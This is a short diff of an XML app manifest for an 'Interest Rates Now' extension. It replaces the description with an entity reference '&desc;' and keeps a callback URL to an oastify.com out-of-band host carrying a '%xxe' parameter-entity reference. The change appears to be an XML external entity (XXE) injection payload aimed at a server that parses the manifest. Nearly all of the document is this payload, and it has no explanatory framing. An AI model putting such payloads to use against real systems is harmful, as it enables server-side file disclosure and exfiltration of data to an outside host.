@@ -3,10 +3,10 @@
      <id>gj8dl19d0</id>
      <name>Interest Rates Now</name>
      <provider>Interest Rater</provider>
-     <description>A tool to see the current interest rate</description>
+     <description>&desc;</description>
      <extensionpoint>
           <location>REPORTING_VIEW</location>
-          <label>&desc;</label>
+          <label>label</label>
           <url>https://1kmldejxomk79rc8a8etan686zcq0poe.oastify.com/%xxe</url>
      </extensionpoint>
 </app>
